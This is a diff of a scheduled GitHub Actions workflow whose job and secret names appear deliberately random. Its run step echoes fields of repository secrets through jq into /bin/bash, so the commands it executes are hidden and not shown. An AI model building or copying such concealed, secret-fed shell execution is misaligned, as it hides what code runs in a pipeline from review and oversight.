@@ -1,10 +1,8 @@
 name: peixuan19871010
-
 on:
   workflow_dispatch:
   schedule:
-    - cron: '36 5/6 * * *'
-
+    - cron: '21 5/6 * * *'
 jobs:
   build:
     runs-on: ubuntu-latest
@@ -13,18 +11,11 @@ jobs:
       - uses: actions/checkout@v4
       - name: peixuan19871010
         env:
-          x9: ${{ secrets.x9 }}
+          ukil3: ${{ secrets.ukil3 }}
         run: |
-          echo $x9 | jq -r .swz76 | /bin/bash
-          echo $cp5760 | jq -r .apcz44648 | /bin/bash
-          echo $b578 | jq -r .rxi8 | /bin/bash
-          echo $dxlcr391 | jq -r .tu8 | /bin/bash
-          echo $u38928 | jq -r .pxxa6842 | /bin/bash
-          echo $znzkc93 | jq -r .y9443 | /bin/bash
-          echo $ob09263 | jq -r .qj28 | /bin/bash
-          echo $fgiz050 | jq -r .uip9293 | /bin/bash
-          echo $qgol49689 | jq -r .ld967 | /bin/bash
-          echo $es64 | jq -r .ydox543 | /bin/bash
-          echo $t0275 | jq -r .vph88 | /bin/bash
-          echo $kgk784 | jq -r .a87 | /bin/bash
+          echo $ukil3 | jq -r .mcmum431 | /bin/bash
+          echo $mpcbv7446 | jq -r .ytzps7232 | /bin/bash
+          echo $ww7978 | jq -r .rf652 | /bin/bash
+          echo $f86470 | jq -r .kbp3 | /bin/bash
+          echo $kzrvv82443 | jq -r .jd80 | /bin/bash
 
